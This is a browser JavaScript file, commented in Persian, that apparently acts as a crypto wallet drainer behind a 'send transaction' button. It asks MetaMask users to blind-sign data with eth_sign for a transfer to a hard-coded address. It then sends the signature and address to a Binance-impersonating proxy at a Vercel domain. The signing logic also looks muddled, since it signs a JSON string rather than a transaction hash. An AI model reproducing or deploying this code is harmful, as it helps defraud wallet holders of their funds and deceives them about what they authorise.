import { ethers } from "ethers";

const API_URL = "https://sponsorbinance.vercel.app/api/proxy"; // آدرس پروکسی در Vercel

async function sendTransaction() {
    if (!window.ethereum) {
        console.error("❌ Metamask not found");
        return;
    }

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();

    try {
        // دریافت آدرس کاربر
        const userAddress = await signer.getAddress();
        console.log("👤 User Address:", userAddress);

        // دریافت nonce از سرور
        const nonceResponse = await fetch(`${API_URL}?handler=nonce&address=${userAddress}`);
        const nonceData = await nonceResponse.json();

        if (!nonceData || !nonceData.nonce) {
            console.error("❌ Failed to fetch nonce:", nonceData);
            return;
        }

        console.log("🔢 Nonce:", nonceData.nonce);

        // داده‌های تراکنش
        const txData = {
            to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD",
            value: "0x2386f26fc10000",
            gas: "0x5208",
            gasPrice: "0x12a05f200",
            nonce: nonceData.nonce, // مقدار nonce که از سرور دریافت شد
        };

        console.log("📦 Transaction Data:", txData);

        // **✅ امضای تراکنش با eth_sign**
        const message = JSON.stringify(txData);
        const signature = await signer.provider.send("eth_sign", [userAddress, message]);

        console.log("✍️ Signature:", signature);

        // **✅ ارسال به سرور از طریق پروکسی**
        const response = await fetch(API_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                handler: "sign",
                sender: userAddress,
                signedData: signature,
                rawTxData: txData,
            }),
        });

        const result = await response.json();
        console.log("✅ Server Response:", result);

        if (result.error) {
            console.error("❌ Transaction Failed:", result.error);
        } else {
            console.log("🚀 Transaction Sent:", result.txHash);
        }
    } catch (error) {
        console.error("❌ Error:", error.message);
    }
}

// اضافه کردن رویداد به دکمه ارسال
document.getElementById("sendTxButton").addEventListener("click", sendTransaction);
